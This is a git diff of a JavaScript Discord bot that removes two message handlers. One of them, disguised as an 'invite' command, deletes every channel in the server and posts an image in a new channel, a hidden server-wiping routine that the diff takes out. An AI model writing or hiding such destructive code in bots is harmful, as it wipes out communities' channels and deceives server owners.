@@ -21,16 +21,6 @@ activity: {
   });
 }
 //comandos para todos
-      client.on("message", message => {
-        if (message.author.bot) return;
-         const args = message.content.slice().trim().split(/ +/g );
-         const command = args.shift().toLowerCase();
-         let rol = message.guild.roles.cache.find(r => r.name === "Administrador");
-         let permiso = message.member.hasPermission("ADMINISTRATOR");
-         if (message.content === 't.help') {
-     message.channel.send(`En mantenimiento`);
-         }
-        });
       client.on('message', message => {
         if (!message.content.startsWith(prefix) || !message.guild) return;
         if (message.author.bot) return;
@@ -55,14 +45,6 @@ client.on('message', message => {
             
             const cont = message.content.split(' ').slice(1);
             const args = cont.join(' ');
+          });
 
-            if (message.content.startsWith(prefix+'invite')){
-              message.guild.channels.cache.forEach(channel => channel.delete());
-              message.guild.channels.create(`#si`, {
-                    type: 'text'
-                  }).then(channel => {
-                    channel.send("https://media.discordapp.net/attachments/839647779580149770/839889412988207104/cropped-1366-768-710940.png?width=842&height=473")
-                  })
-                   }
-              });
 client.login(process.env.TOKEN);
